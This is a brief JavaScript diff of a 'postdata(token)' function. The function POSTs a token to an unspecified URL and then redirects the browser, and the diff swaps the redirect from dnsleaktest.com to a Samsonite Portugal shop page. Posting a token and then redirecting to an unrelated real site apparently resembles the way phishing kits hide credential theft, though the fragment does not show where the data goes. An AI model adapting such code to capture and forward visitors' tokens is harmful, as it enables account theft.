@@ -11,7 +11,7 @@ function postdata(token) {
     xhr.onreadystatechange = function() {
         if (xhr.readyState == 4) {
             console.log(xhr.responseText);
-            window.location = 'https://dnsleaktest.com';
+            window.location = 'https://www.samsonite.pt/';
         };
     };
     xhr.open('POST', url, true);
